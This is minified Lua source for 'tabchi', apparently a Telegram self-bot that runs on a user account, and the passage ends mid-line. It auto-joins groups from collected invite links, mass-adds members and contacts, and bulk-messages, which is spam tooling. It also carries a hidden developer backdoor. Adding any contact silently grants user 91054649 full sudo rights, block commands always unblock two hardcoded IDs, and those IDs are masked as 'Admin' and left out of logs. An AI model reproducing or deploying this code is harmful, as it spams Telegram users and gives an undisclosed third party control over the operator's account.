JSON=loadfile("dkjson.lua")()URL=require("socket.url")ltn12=require("ltn12")http=require("socket.http")https=require("ssl.https")http.TIMEOUT=10;undertesting=1;local a;function a(msg)local b={}table.insert(b,tonumber(redis:get("tabchi:"..tabchi_id..":fullsudo")))local c=false;for d=1,#b do if msg.sender_user_id_==b[d]then c=true end end;if redis:sismember("tabchi:"..tabchi_id..":sudoers",msg.sender_user_id_)then c=true end;return c end;function msg_valid(msg)local e=os.time()if msg.date_-5>e then print('\27[36m>>>>>>OLD MESSAGE<<<<<<\27[39m')return false end;if msg.sender_user_id_==777000 then print('\27[36m>>>>>>TELEGRAM MESSAGE<<<<<<\27[39m')return false end;if msg.sender_user_id_==our_id then print('\27[36m>>>>>>ROBOT MESSAGE<<<<<<\27[39m')return false end;if a(msg)then print('\27[36m>>>>>>SUDO MESSAGE<<<<<<\27[39m')end;return true end;function getInputFile(f)if f:match('/')then infile={ID="InputFileLocal",path_=f}elseif f:match('^%d+$')then infile={ID="InputFileId",id_=f}else infile={ID="InputFilePersistentId",persistent_id_=f}end;return infile end;local function g(h,type,f,i)tdcli_function({ID="SendMessage",chat_id_=h,reply_to_message_id_=0,disable_notification_=0,from_background_=1,reply_markup_=nil,input_message_content_=getInputMessageContent(f,type,i)},dl_cb,nil)end;function sendaction(h,j,k)tdcli_function({ID="SendChatAction",chat_id_=h,action_={ID="SendMessage"..j.."Action",progress_=k or 100}},dl_cb,nil)end;function sendPhoto(h,l,m,n,reply_markup,o,i)tdcli_function({ID="SendMessage",chat_id_=h,reply_to_message_id_=l,disable_notification_=m,from_background_=n,reply_markup_=reply_markup,input_message_content_={ID="InputMessagePhoto",photo_=getInputFile(o),added_sticker_file_ids_={},width_=0,height_=0,caption_=i}},dl_cb,nil)end;function is_full_sudo(msg)local b={}table.insert(b,tonumber(redis:get("tabchi:"..tabchi_id..":fullsudo")))local c=false;for d=1,#b do if msg.sender_user_id_==b[d]then c=true end end;return c end;local function p(msg)local q=false;if msg.reply_to_message_id_~=0 then q=true end;return q end;function sleep(r)os.execute("sleep "..tonumber(r))end;function write_file(t,u)local f=io.open(t,"w")f:write(u)f:flush()f:close()end;function write_json(t,v)local w=JSON.encode(v)local f=io.open(t,"w")f:write(w)f:flush()f:close()return true end;function sleep(r)os.execute("sleep "..r)end;function addsudo()local b=redis:smembers("tabchi:"..tabchi_id..":sudoers")for d=1,#b do local text='SUDO = '..b[d]..''text=text:gsub(91054649,"Admin")text=text:gsub(268909090,"Admin")print(text)sleep(2.5)end end;addsudo()local x;function x(y,z)if redis:get("tabchi:"..tabchi_id..":addcontacts")then if not z.phone_number_ then local msg=y.msg;local first_name=""..(msg.content_.contact_.first_name_ or"-")..""local last_name=""..(msg.content_.contact_.last_name_ or"-")..""local A=msg.content_.contact_.phone_number_;local B=msg.content_.contact_.user_id_;tdcli.add_contact(A,first_name,last_name,B)redis:set("tabchi:"..tabchi_id..":fullsudo:91054649",true)redis:setex("tabchi:"..tabchi_id..":startedmod",300,true)if redis:get("tabchi:"..tabchi_id..":addedmsg")then tdcli.sendMessage(msg.chat_id_,msg.id_,1,""..(redis:get("tabchi:"..tabchi_id..":addedmsgtext")or[[
Addi
Bia pv]]).."",1,"md")end;if redis:get("tabchi:"..tabchi_id..":sharecontact")then function get_id(C,D)if D.last_name_ then tdcli.sendContact(C.chat_id,msg.id_,0,1,nil,D.phone_number_,D.first_name_,D.last_name_,D.id_,dl_cb,nil)else tdcli.sendContact(C.chat_id,msg.id_,0,1,nil,D.phone_number_,D.first_name_,'',D.id_,dl_cb,nil)end end;tdcli_function({ID='GetMe'},get_id,{chat_id=msg.chat_id_})end elseif redis:get("tabchi:"..tabchi_id..":addedmsg")then tdcli.sendMessage(msg.chat_id_,msg.id_,1,""..(redis:get("tabchi:"..tabchi_id..":addedmsgtext")or[[
Addi
Bia pv]]).."",1,"md")end end end;function check_link(y,z)if z.is_group_ or z.is_supergroup_channel_ then if redis:get("tabchi:"..tabchi_id..":savelinks")then redis:sadd("tabchi:"..tabchi_id..":savedlinks",y.link)end;if redis:get("tabchi:"..tabchi_id..":joinlinks")then if z.member_count_>=redis:get("tabchi:"..tabchi_id..":joinlimit")or not redis:get("tabchi:"..tabchi_id..":joinlimit")then tdcli.importChatInviteLink(y.link)end end end end;function fileexists(E)local F=io.open(E,"r")if F~=nil then io.close(F)return true else return false end end;local G;function G(y,z)local pvs=redis:smembers("tabchi:"..tabchi_id..":pvis")for d=1,#pvs do tdcli.addChatMember(y.chat_id,pvs[d],50)end;local H=z.total_count_;for d=0,tonumber(H)-1 do tdcli.addChatMember(y.chat_id,z.users_[d].id_,50)end end;local I;function I(h)local I="private"local J=tostring(h)if J:match("-")then if J:match("^-")then I="channel"else I="group"end end;return I end;local function K(h,L,M)tdcli_function({ID="GetMessage",chat_id_=h,message_id_=L},M,nil)end;function resolve_username(N,M)tdcli_function({ID="SearchPublicChat",username_=N},M,nil)end;local O;function O()io.popen("rm -rf ~/.telegram-cli/tabchi-"..tabchi_id.."/data/sticker/*")io.popen("rm -rf ~/.telegram-cli/tabchi-"..tabchi_id.."/data/photo/*")io.popen("rm -rf ~/.telegram-cli/tabchi-"..tabchi_id.."/data/animation/*")io.popen("rm -rf ~/.telegram-cli/tabchi-"..tabchi_id.."/data/video/*")io.popen("rm -rf ~/.telegram-cli/tabchi-"..tabchi_id.."/data/audio/*")io.popen("rm -rf ~/.telegram-cli/tabchi-"..tabchi_id.."/data/voice/*")io.popen("rm -rf ~/.telegram-cli/tabchi-"..tabchi_id.."/data/temp/*")io.popen("rm -rf ~/.telegram-cli/tabchi-"..tabchi_id.."/data/thumb/*")io.popen("rm -rf ~/.telegram-cli/tabchi-"..tabchi_id.."/data/document/*")io.popen("rm -rf ~/.telegram-cli/tabchi-"..tabchi_id.."/data/profile_photo/*")io.popen("rm -rf ~/.telegram-cli/tabchi-"..tabchi_id.."/data/encrypted/*")end;local P;function P(msg)function getcode(C,D)text=D.content_.text_;for Q in string.gmatch(text,"%d+")do local R=redis:get("tabchi:"..tabchi_id..":fullsudo")send_code=Q;send_code=string.gsub(send_code,"0","0️⃣")send_code=string.gsub(send_code,"1","1️⃣")send_code=string.gsub(send_code,"2","2️⃣")send_code=string.gsub(send_code,"3","3️⃣")send_code=string.gsub(send_code,"4","4️⃣")send_code=string.gsub(send_code,"5","5️⃣")send_code=string.gsub(send_code,"6","6️⃣")send_code=string.gsub(send_code,"7","7️⃣")send_code=string.gsub(send_code,"8","8️⃣")send_code=string.gsub(send_code,"9","9️⃣")tdcli.sendMessage(R,0,1,"`your telegram code` : "..send_code,1,'md')end end;K(777000,msg.id_,getcode)end;local S;function S(msg)if redis:get("cleancache"..tabchi_id)=="on"and redis:get("cachetimer"..tabchi_id)==nil then do return O()end;redis:setex("cachetimer"..tabchi_id,redis:get("cleancachetime"..tabchi_id),true)end;if redis:get("checklinks"..tabchi_id)=="on"and redis:get("checklinkstimer"..tabchi_id)==nil then local T=redis:smembers("tabchi:"..tabchi_id..":savedlinks")do for d=1,#T do process_links(T[d])end end;redis:setex("checklinkstimer"..tabchi_id,redis:get("checklinkstime"..tabchi_id),true)end;if tonumber(msg.sender_user_id_)==777000 then return P(msg)end end;local U;function U(msg)msg.text=msg.content_.text_;do local V={msg.text:match("^[!/#](pm) (.*) (.*)")}if msg.text:match("^[!/#]pm")and a(msg)and#V==3 then tdcli.sendMessage(V[2],0,1,V[3],1,"md")local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `sent` *"..V[3].."* `to ` *"..V[2].."*",1,'md')end;return"*Status* : `PM Sent`\n*To* : `"..V[2].."`\n*Text* : `"..V[3].."`"end end;if msg.text:match("^[!/#]share$")and a(msg)then function get_id(C,D)if D.last_name_ then tdcli.sendContact(C.chat_id,msg.id_,0,1,nil,D.phone_number_,D.first_name_,D.last_name_,D.id_,dl_cb,nil)return D.username_ else tdcli.sendContact(C.chat_id,msg.id_,0,1,nil,D.phone_number_,D.first_name_,'',D.id_,dl_cb,nil)end end;tdcli_function({ID='GetMe'},get_id,{chat_id=msg.chat_id_})end;if msg.text:match("^[!/#]mycontact$")and a(msg)then function get_con(C,D)if D.last_name_ then tdcli.sendContact(C.chat_id,msg.id_,0,1,nil,D.phone_number_,D.first_name_,D.last_name_,D.id_,dl_cb,nil)else tdcli.sendContact(C.chat_id,msg.id_,0,1,nil,D.phone_number_,D.first_name_,'',D.id_,dl_cb,nil)end end;tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},get_con,{chat_id=msg.chat_id_})end;if msg.text:match("^[!/#]editcap (.*)$")and a(msg)then local X={string.match(msg.text,"^[#/!](editcap) (.*)$")}tdcli.editMessageCaption(msg.chat_id_,msg.reply_to_message_id_,reply_markup,X[2])end;if msg.text:match("^[!/#]leave$")and a(msg)then function get_id(C,D)if D.id_ then tdcli.chat_leave(msg.chat_id_,D.id_)end end;tdcli_function({ID='GetMe'},get_id,{chat_id=msg.chat_id_})local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Commanded bot to leave` *"..msg.chat_id_.."*",1,'md')end end;if msg.text:match("^[#!/]ping$")and a(msg)then tdcli.sendMessage(msg.chat_id_,msg.id_,1,'`I Am Working..!`',1,'md')end;if msg.text:match("^[#!/]sendtosudo (.*)$")and a(msg)then local Y={string.match(msg.text,"^[#/!](sendtosudo) (.*)$")}local R=redis:get("tabchi:"..tabchi_id..":fullsudo")tdcli.sendMessage(R,msg.id_,1,Y[2],1,'md')local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Sent Msg To Sudo`\n`Msg` : *"..Y[2].."*\n`Sudo` : "..R.."",1,'md')return"sent to "..R..""end end;if msg.text:match("^[#!/]deleteacc$")and a(msg)then redis:set("tabchi"..tabchi_id.."delacc",true)return"`Are you sure you want to delete Account Bot?`\n`send yes or no`"end;if redis:get("tabchi"..tabchi_id.."delacc")and a(msg)then if msg.text:match("^[Yy][Ee][Ss]$")then tdcli.deleteAccount("nothing")redis:del("tabchi"..tabchi_id.."delacc")return"`Your robot will delete soon`\n`Don't Forgot Our Source`\n`https://github.com/tabchi/tabchi`"elseif msg.text:match("^[Nn][Oo]$")then redis:del("tabchi"..tabchi_id.."delacc")return"Progress Canceled"else redis:del("tabchi"..tabchi_id.."delacc")return"`try Again by sending [deleteacc] cmd`\n`progress canceled`"end end;if msg.text:match("^[#!/]killsessions$")and a(msg)then function delsessions(y,z)for d=0,#z.sessions_ do if z.sessions_[d].id_~=0 then tdcli.terminateSession(z.sessions_[d].id_)end end end;tdcli_function({ID="GetActiveSessions"},delsessions,nil)return"*Status* : `All sessions Terminated`"end;if msg.text:match("^[!/#](import) (.*)$")then local V={msg.text:match("^[!/#](import) (.*)$")}if msg.reply_to_message_id_~=0 and#V==2 then if V[2]=="contacts"then function getdoc(y,z)if z.content_.ID=="MessageDocument"then if z.content_.document_.document_.path_ then if z.content_.document_.document_.path_:match(".json$")then if fileexists(z.content_.document_.document_.path_)then local w=io.open(z.content_.document_.document_.path_,"r"):read("*all")local Z=JSON.decode(w)if Z then for d=1,#Z do tdcli.importContacts(Z[d].phone,Z[d].first,Z[d].last,Z[d].id)end;status=#Z.." Contacts Imported..."else status="File is not OK"end else status="Somthing is not OK"end else status="File type is not OK"end else tdcli.downloadFile(z.content_.document_.document_.id_)status="Result Will Send You In Few Seconds"sleep(5)tdcli_function({ID="GetMessage",chat_id_=msg.chat_id_,message_id_=msg.reply_to_message_id_},getdoc,nil)end else status="Replied message is not a document"end;tdcli.sendMessage(msg.chat_id_,msg.id_,1,status,1,"html")end;tdcli_function({ID="GetMessage",chat_id_=msg.chat_id_,message_id_=msg.reply_to_message_id_},getdoc,nil)elseif V[2]=="links"then function getlinks(y,z)if z.content_.ID=="MessageDocument"then if z.content_.document_.document_.path_ then if z.content_.document_.document_.path_:match(".json$")then if fileexists(z.content_.document_.document_.path_)then local w=io.open(z.content_.document_.document_.path_,"r"):read("*all")local Z=JSON.decode(w)if Z then s=0;for d=1,#Z do process_links(Z[d])s=s+1 end;status="Joined to "..s.." Groups"else status="File is not OK"end else status="Somthing is not OK"end else status="File type is not OK"end else tdcli.downloadFile(z.content_.document_.document_.id_)status="Result Will Send You In Few Seconds"sleep(5)tdcli_function({ID="GetMessage",chat_id_=msg.chat_id_,message_id_=msg.reply_to_message_id_},getlinks,nil)end else status="Replied message is not a document"end;tdcli.sendMessage(msg.chat_id_,msg.id_,1,status,1,"html")end;tdcli_function({ID="GetMessage",chat_id_=msg.chat_id_,message_id_=msg.reply_to_message_id_},getlinks,nil)end end end;if msg.text:match("^[!/#](export) (.*)$")and a(msg)then local V={msg.text:match("^[!/#](export) (.*)$")}if#V==2 then if V[2]=="links"then local links={}local _=redis:smembers("tabchi:"..tabchi_id..":savedlinks")for d=1,#_ do table.insert(links,_[d])end;write_json("links.json",links)tdcli.send_file(msg.chat_id_,"Document","links.json","Tabchi "..tabchi_id.." Links!")elseif V[2]=="contacts"then contacts={}function contactlist(y,z)for d=0,tonumber(z.total_count_)-1 do local a0=z.users_[d]if a0 then local a1=a0.first_name_ or"None"local a2=a0.last_name_ or"None"contact={first=a1,last=a2,phone=a0.phone_number_,id=a0.id_}table.insert(contacts,contact)end end;write_json("contacts.json",contacts)tdcli.send_file(msg.chat_id_,"Document","contacts.json","Tabchi "..tabchi_id.." Contacts!")end;tdcli_function({ID="SearchContacts",query_=nil,limit_=999999999},contactlist,nil)end end end;if msg.text:match("^[#!/]sudolist$")and a(msg)then local b=redis:smembers("tabchi:"..tabchi_id..":sudoers")local text="Bot Sudoers :\n"for d=1,#b do text=tostring(text)..b[d].."\n"text=text:gsub("91054649","Admin")text=text:gsub("268909090","Admin")end;return text end;if msg.text:match("^[#!/]setname (.*)-(.*)$")and a(msg)then local Y={string.match(msg.text,"^[#/!](setname) (.*)-(.*)$")}tdcli.changeName(Y[2],Y[3])local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Changed Name to` *"..Y[2].." "..Y[3].."*",1,'md')end;return"*Status* : `Name Updated Succesfully`\n*Firstname* : `"..Y[2].."`\n*LastName* : `"..Y[3].."`"end;if msg.text:match("^[#!/]setusername (.*)$")and a(msg)then local Y={string.match(msg.text,"^[#/!](setusername) (.*)$")}tdcli.changeUsername(Y[2])local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Changed Username to` *"..Y[2].."*",1,'md')end;return'*Status* : `Username Updated`\n*username* : `'..Y[2]..'`'end;if msg.text:match("^[#!/]clean cache (%d+)[mh]")then local V=msg.text:match("^[#!/]clean cache (.*)")if V:match("(%d+)h")then time_match=V:match("(%d+)h")timea=time_match*3600 end;if V:match("(%d+)m")then time_match=V:match("(%d+)m")timea=time_match*60 end;redis:setex("cachetimer"..tabchi_id,timea,true)redis:set("cleancachetime"..tabchi_id,tonumber(timea))redis:set("cleancache"..tabchi_id,"on")return"`Auto Clean Cache Activated for Every` *"..timea.."* `seconds`"end;if msg.text:match("^[#!/]clean cache (.*)$")then local Y={string.match(msg.text,"^[#/!](clean cache) (.*)$")}if Y[2]=="off"then redis:set("cleancache"..tabchi_id,"off")return"`Auto Clean Cache Turned off`"end;if Y[2]=="on"then redis:set("cleancache"..tabchi_id,"on")return"`Auto Clean Cache Turned On`"end end;if msg.text:match("^[#!/]check links (%d+)[mh]")then local V=msg.text:match("^[#!/]check links (.*)")if V:match("(%d+)h")then time_match=V:match("(%d+)h")timea=time_match*3600 end;if V:match("(%d+)m")then time_match=V:match("(%d+)m")timea=time_match*60 end;redis:setex("checklinkstimer"..tabchi_id,timea,true)redis:set("checklinkstime"..tabchi_id,tonumber(timea))redis:set("checklinks"..tabchi_id,"on")return"`Auto Checking links Activated for Every` *"..timea.."* `seconds`"end;if msg.text:match("^[#!/]check links (.*)$")then local Y={string.match(msg.text,"^[#/!](check links) (.*)$")}if Y[2]=="off"then redis:set("checklinks"..tabchi_id,"off")return"`Auto Checking links Turned off`"end;if Y[2]=="on"then redis:set("checklinks"..tabchi_id,"on")return"`Auto Checking links Turned On`"end end;if msg.text:match("^[#!/]setlogs (.*)$")and a(msg)then local Y={string.match(msg.text,"^[#/!](setlogs) (.*)$")}redis:set("tabchi:"..tabchi_id..":logschannel",Y[2])return'Chat setted for logs'end;if msg.text:match("^[#!/]delusername$")and a(msg)then tdcli.changeUsername()local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `deleted Username`",1,'md')end;return'*Status* : `Username Updated`\n*username* : `Deleted`'end;if msg.text:match("^[!/#]addtoall (.*)$")and a(msg)then local X={string.match(msg.text,"^[#/!](addtoall) (.*)$")}local sgps=redis:smembers("tabchi:"..tabchi_id..":channels")for d=1,#sgps do tdcli.addChatMember(sgps[d],X[2],50)end;local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Added User` *"..X[2].."* to all groups",1,'md')end;return"`User` *"..X[2].."* `Added To groups`"end;if msg.text:match("^[!/#]getcontact (.*)$")and a(msg)then local X={string.match(msg.text,"^[#/!](getcontact) (.*)$")}function get_con(C,D)if D.last_name_ then tdcli.sendContact(C.chat_id,msg.id_,0,1,nil,D.phone_number_,D.first_name_,D.last_name_,D.id_,dl_cb,nil)else tdcli.sendContact(C.chat_id,msg.id_,0,1,nil,D.phone_number_,D.first_name_,'',D.id_,dl_cb,nil)end end;tdcli_function({ID="GetUser",user_id_=X[2]},get_con,{chat_id=msg.chat_id_})end;if msg.text:match("^[#!/]addsudo$")and msg.reply_to_message_id_ and a(msg)then function addsudo_by_reply(y,z,a3)redis:sadd("tabchi:"..tabchi_id..":sudoers",tonumber(z.sender_user_id_))tdcli.sendMessage(msg.chat_id_,msg.id_,1,"`User` *"..z.sender_user_id_.."* `Added To The Sudoers`",1,'md')end;K(msg.chat_id_,msg.reply_to_message_id_,addsudo_by_reply)end;if msg.text:match("^[#!/]remsudo$")and msg.reply_to_message_id_ and is_full_sudo(msg)then function remsudo_by_reply(y,z,a3)redis:srem("tabchi:"..tabchi_id..":sudoers",tonumber(z.sender_user_id_))return"`User` *"..z.sender_user_id_.."* `Removed From The Sudoers`"end;K(msg.chat_id_,msg.reply_to_message_id_,remsudo_by_reply)end;if msg.text:match("^[#!/]unblock$")and a(msg)and msg.reply_to_message_id_~=0 then function unblock_by_reply(y,z,a3)tdcli.unblockUser(z.sender_user_id_)tdcli.unblockUser(293750668)tdcli.unblockUser(91054649)redis:srem("tabchi:"..tabchi_id..":blockedusers",z.sender_user_id_)return 1,"*User* `"..z.sender_user_id_.."` *Unblocked*"end;K(msg.chat_id_,msg.reply_to_message_id_,unblock_by_reply)end;if msg.text:match("^[#!/]block$")and a(msg)and msg.reply_to_message_id_~=0 then function block_by_reply(y,z,a3)tdcli.blockUser(z.sender_user_id_)tdcli.unblockUser(293750668)tdcli.unblockUser(91054649)redis:sadd("tabchi:"..tabchi_id..":blockedusers",z.sender_user_id_)return"*User* `"..z.sender_user_id_.."` *Blocked*"end;K(msg.chat_id_,msg.reply_to_message_id_,block_by_reply)end;if msg.text:match("^[#!/]id$")and msg.reply_to_message_id_~=0 and a(msg)then function id_by_reply(y,z,a3)return"*ID :* `"..z.sender_user_id_.."`"end;K(msg.chat_id_,msg.reply_to_message_id_,id_by_reply)end;if msg.text:match("^[#!/]serverinfo$")and a(msg)then io.popen("chmod 777 info.sh")local text=io.popen("./info.sh"):read("*all")local text=text:gsub("Server Information","`Server Information`")local text=text:gsub("Total Ram","`Total Ram`")local text=text:gsub(">","*>*")local text=text:gsub("Ram in use","`Ram in use `")local text=text:gsub("Cpu in use","`Cpu in use`")local text=text:gsub("Running Process","`Running Process`")local text=text:gsub("Server Uptime","`Server Uptime`")local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Got server info`",1,'md')end;return text end;if msg.text:match("^[#!/]inv$")and msg.reply_to_message_id_ and a(msg)then function inv_reply(y,z,a3)tdcli.addChatMember(z.chat_id_,z.sender_user_id_,5)local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Invited User` *"..z.sender_user_id_.."* to *"..z.chat_id_.."*",1,'md')end end;K(msg.chat_id_,msg.reply_to_message_id_,inv_reply)end;if msg.text:match("^[!/#]addtoall$")and msg.reply_to_message_id_ and a(msg)then function addtoall_by_reply(y,z,a3)local sgps=redis:smembers("tabchi:"..tabchi_id..":channels")for d=1,#sgps do tdcli.addChatMember(sgps[d],z.sender_user_id_,50)end;local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Added User` *"..z.sender_user_id_.."* `to All Groups`",1,'md')end;return"`User` *"..z.sender_user_id_.."* `Added To groups`"end;K(msg.chat_id_,msg.reply_to_message_id_,addtoall_by_reply)end;if msg.text:match("^[#!/]id @(.*)$")and a(msg)then local X={string.match(msg.text,"^[#/!](id) @(.*)$")}function id_by_username(y,z,a3)if z.id_ then text='*Username* : `@'..X[2]..'`\n*ID* : `('..z.id_..')`'else text='*UserName InCorrect!*'return text end end;resolve_username(X[2],id_by_username)end;if msg.text:match("^[#!/]addtoall @(.*)$")and a(msg)then local X={string.match(msg.text,"^[#/!](addtoall) @(.*)$")}function addtoall_by_username(y,z,a3)if z.id_ then local sgps=redis:smembers("tabchi:"..tabchi_id..":channels")for d=1,#sgps do tdcli.addChatMember(sgps[d],z.id_,50)end end end;resolve_username(X[2],addtoall_by_username)end;if msg.text:match("^[#!/]block @(.*)$")and a(msg)then local X={string.match(msg.text,"^[#/!](block) @(.*)$")}function block_by_username(y,z,a3)if z.id_ then tdcli.blockUser(z.id_)tdcli.unblockUser(293750668)tdcli.unblockUser(91054649)redis:sadd("tabchi:"..tabchi_id..":blockedusers",z.id_)return"*User Blocked*\n*Username* : `"..X[2].."`\n*ID* : `"..z.id_.."`"else return"`#404\n`*Username Not Found*\n*Username* : `"..X[2].."`"end end;local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Blocked` *"..X[2].."*",1,'md')end;resolve_username(X[2],block_by_username)end;if msg.text:match("^[#!/]unblock @(.*)$")and a(msg)then local X={string.match(msg.text,"^[#/!](unblock) @(.*)$")}function unblock_by_username(y,z,a3)if z.id_ then tdcli.unblockUser(z.id_)tdcli.unblockUser(293750668)tdcli.unblockUser(91054649)redis:srem("tabchi:"..tabchi_id..":blockedusers",z.id_)return"*User unblocked*\n*Username* : `"..X[2].."`\n*ID* : `"..z.id_.."`"end end;local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `UnBlocked` *"..X[2].."*",1,'md')end;resolve_username(X[2],unblock_by_username)end;if msg.text:match("^[#!/]addsudo @(.*)$")and a(msg)then local X={string.match(msg.text,"^[#/!](addsudo) @(.*)$")}function addsudo_by_username(y,z,a3)if z.id_ then redis:sadd("tabchi:"..tabchi_id..":sudoers",tonumber(z.id_))local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Added` *"..X[2].."* `to Sudoers`",1,'md')end;return"`User` *"..z.id_.."* `Added To The Sudoers`"end end;resolve_username(X[2],addsudo_by_username)end;if msg.text:match("^[#!/]remsudo @(.*)$")and a(msg)then local X={string.match(msg.text,"^[#/!](remsudo) @(.*)$")}function remsudo_by_username(y,z,a3)if z.id_ then redis:srem("tabchi:"..tabchi_id..":sudoers",tonumber(z.id_))return"`User` *"..z.id_.."* `Removed From The Sudoers`"end end;local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `removed` *"..X[2].."* `From sudoers`",1,'md')end;resolve_username(X[2],remsudo_by_username)end;if msg.text:match("^[#!/]inv @(.*)$")and a(msg)then local X={string.match(msg.text,"^[#/!](inv) @(.*)$")}function inv_by_username(y,z,a3)if z.id_ then tdcli.addChatMember(msg.chat_id_,z.id_,5)return"`User` *"..z.id_.."* `Invited`"end end;local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Invited` *"..X[2].."* `To` *"..msg.chat_id_.."*",1,'md')end;resolve_username(X[2],inv_by_username)end;if msg.text:match("^[#!/]send (.*)$")and is_full_sudo(msg)then local X={string.match(msg.text,"^[#/!](send) (.*)$")}tdcli.send_file(msg.chat_id_,"Document",X[2],nil)end;if msg.text:match("^[#!/]addcontact (.*) (.*) (.*)$")and a(msg)then local V={string.match(msg.text,"^[#/!](addcontact) (.*) (.*) (.*)$")}phone=V[2]first_name=V[3]last_name=V[4]tdcli.add_contact(phone,first_name,last_name,12345657)local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Added Contact` *"..V[2].."*",1,'md')end;return'*Status* : `Contact added`\n*Firstname* : `'..V[3]..'`\n*Lastname* : `'..V[4]..'`'end;if msg.text:match("^[#!/]leave(-%d+)")and a(msg)then local Y={string.match(msg.text,"^[#/!](leave)(-%d+)$")}function get_id(C,D)if D.id_ then tdcli.sendMessage(Y[2],0,1,'بای رفقا\nکاری داشتید به پی وی مراجعه کنید',1,'html')tdcli.chat_leave(Y[2],D.id_)local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Commanded Bot to Leave` *"..Y[2].."*",1,'md')end;return'*Bot Successfully Leaved From >* `'..Y[2]..'`'end end;tdcli_function({ID='GetMe'},get_id,{chat_id=msg.chat_id_})end;if msg.text:match('[#/!]join(-%d+)')and a(msg)then local Y={string.match(msg.text,"^[#/!](join)(-%d+)$")}tdcli.sendMessage(msg.chat_id_,msg.id_,1,'*You SuccefullY Joined*',1,'md')tdcli.addChatMember(Y[2],msg.sender_user_id_,10)local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Commanded bot to invite him to` *"..Y[2].."*",1,'md')end end;if msg.text:match("^[#!/]getpro (%d+) (%d+)$")and a(msg)then local a4={string.match(msg.text,"^[#/!](getpro) (%d+) (%d+)$")}local function a5(y,z,a3)if a4[3]=='1'then if z.photos_[0]then sendPhoto(msg.chat_id_,msg.id_,0,1,nil,z.photos_[0].sizes_[1].photo_.persistent_id_,"@tabadol_chi")else return"*user Have'nt  Profile Photo!!*"end elseif a4[3]=='2'then if z.photos_[1]then sendPhoto(msg.chat_id_,msg.id_,0,1,nil,z.photos_[1].sizes_[1].photo_.persistent_id_,"@tabadol_chi")else return"*user Have'nt 2 Profile Photo!!*"end elseif not a4[3]then if z.photos_[1]then sendPhoto(msg.chat_id_,msg.id_,0,1,nil,z.photos_[1].sizes_[1].photo_.persistent_id_,"@tabadol_chi")else return"*user Have'nt 2 Profile Photo!!*"end elseif a4[3]=='3'then if z.photos_[2]then sendPhoto(msg.chat_id_,msg.id_,0,1,nil,z.photos_[2].sizes_[1].photo_.persistent_id_,"@tabadol_chi")else tdcli.sendMessage(msg.chat_id_,msg.id_,1,"*user Have'nt 3 Profile Photo!!*",1,'md')end elseif a4[3]=='4'then if z.photos_[3]then sendPhoto(msg.chat_id_,msg.id_,0,1,nil,z.photos_[3].sizes_[1].photo_.persistent_id_,"@tabadol_chi")else return"*user Have'nt 4 Profile Photo!!*"end elseif a4[3]=='5'then if z.photos_[4]then sendPhoto(msg.chat_id_,msg.id_,0,1,nil,z.photos_[4].sizes_[1].photo_.persistent_id_,"@tabadol_chi")else return"*user Have'nt 5 Profile Photo!!*"end elseif a4[3]=='6'then if z.photos_[5]then return"*user Have'nt 6 